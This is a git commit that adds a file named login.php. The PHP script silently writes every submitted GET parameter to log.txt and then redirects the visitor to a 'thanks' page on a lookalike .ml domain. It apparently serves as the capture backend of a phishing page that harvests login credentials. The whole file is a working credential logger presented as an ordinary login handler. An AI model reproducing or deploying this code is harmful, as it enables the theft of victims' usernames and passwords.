99927fb059b4b423a2bedf53dd34cf7c1f53edea
unknownuser012 <75834246+unknownuser012@users.noreply.github.com>
2021-04-30 20:24:03 +0530

    Add files via upload

---
+++ login.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location:https://srichaitanyaebooks.ml/thanks.html');
+$handle = fopen("log.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
